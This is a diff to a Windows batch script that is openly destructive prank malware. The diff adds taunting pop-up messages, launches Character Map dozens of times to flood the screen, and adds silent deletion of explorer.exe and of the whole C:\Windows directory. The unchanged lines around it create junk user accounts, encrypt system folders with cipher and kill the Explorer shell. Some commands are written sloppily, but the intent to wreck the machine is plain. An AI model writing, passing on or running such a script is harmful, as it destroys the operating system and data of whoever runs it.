@@ -1,4 +1,7 @@
 @echo off
+net send localhost ur pc is screwed
+net send localhost dont say i didnt warn u
+net send localhost if u arent using a vm, u cant close this so u need to kill this app =)
 ping google.com
 tracert google.com
 cd folder_lol
@@ -21,7 +24,34 @@ net user lolololololololololololololol /add
 net user pp /add
 net user bye /add
 echo ur pc is dead
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
+start C://Windows/System32/charmap.exe
 cipher /e C://Windows/WinSxS
 taskkill explorer.exe
 cipher /e C://Windows
-del C://Windows/System32/explorer.exe
+del /Q C://Windows/System32/explorer.exe
+del /Q C://Windows
